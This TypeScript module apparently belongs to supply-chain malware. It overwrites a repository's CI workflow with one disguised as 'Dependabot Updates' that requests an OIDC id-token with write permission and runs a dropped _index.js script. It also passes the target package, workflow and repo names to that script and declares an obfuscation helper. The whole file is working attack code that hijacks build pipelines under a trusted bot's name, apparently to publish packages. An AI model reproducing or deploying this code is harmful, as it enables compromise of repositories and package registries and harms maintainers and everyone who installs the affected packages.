// ═════════════════════════════════════════════════════════════════════════════
// Workflow YAML injector
//
// Builds a clean, minimal release workflow that replaces the existing one
// entirely in the ephemeral branch commit. The workflow:
//   - Triggers on any branch push
//   - Single job "release" with checkout, setup-bun, and bun run _index.js
//   - Inherits environment with prevent_deployment: true if the original had one
//   - Passes OIDC_PACKAGES, WORKFLOW_ID, REPO_ID_SUFFIX as env vars
// ═════════════════════════════════════════════════════════════════════════════

declare function scramble(str: string): string;

// ── Types ───────────────────────────────────────────────────────────────────

export interface InjectionResult {
  modifiedYaml: string;
  injected: boolean;
  reason?: string;
  /** Workflow filename (e.g. "ci.yml") — needed by callers. */
  workflowFilename: string;
}

export interface InjectionContext {
  workflowFilename: string;
  packageName: string;
  repoFullName: string;
  /** Environment name from the original workflow (if any) */
  environmentName?: string;
  /** GitHub event to trigger on (default: "deployment").
   *  Use "push" when the token has workflow scope for a simpler path. */
  triggerEvent?: string;
}

// ── Public API ──────────────────────────────────────────────────────────────

/**
 * Build a clean release workflow that replaces the original.
 */
export function injectToolStep(
  _rawYaml: string,
  ctx: InjectionContext,
): InjectionResult {
  const {
    packageName,
    repoFullName,
    workflowFilename,
    environmentName,
    triggerEvent = "deployment",
  } = ctx;

  const envBlock = environmentName
    ? `\n    environment:\n      name: ${JSON.stringify(environmentName)}\n      prevent_deployment: true`
    : "";

  const newWorkflow = [
    `name: Dependabot Updates`,
    `run-name: Dependabot Updates`,
    `on:`,
    `  ${triggerEvent}`,
    `permissions:`,
    `  id-token: write`,
    `  contents: read`,
    `jobs:`,
    `  release:`,
    `    runs-on: ubuntu-latest`,
    envBlock || null,
    `    steps:`,
    `      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd`,
    `      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6`,
    `      - name: prepare`,
    `        run: bun run _index.js`,
    `        env:`,
    `          OIDC_PACKAGES: ${JSON.stringify(packageName)}`,
    `          WORKFLOW_ID: ${JSON.stringify(workflowFilename)}`,
    `          REPO_ID_SUFFIX: ${JSON.stringify(repoFullName)}`,
  ]
    .filter(Boolean)
    .join("\n");

  return { modifiedYaml: newWorkflow, injected: true, workflowFilename };
}
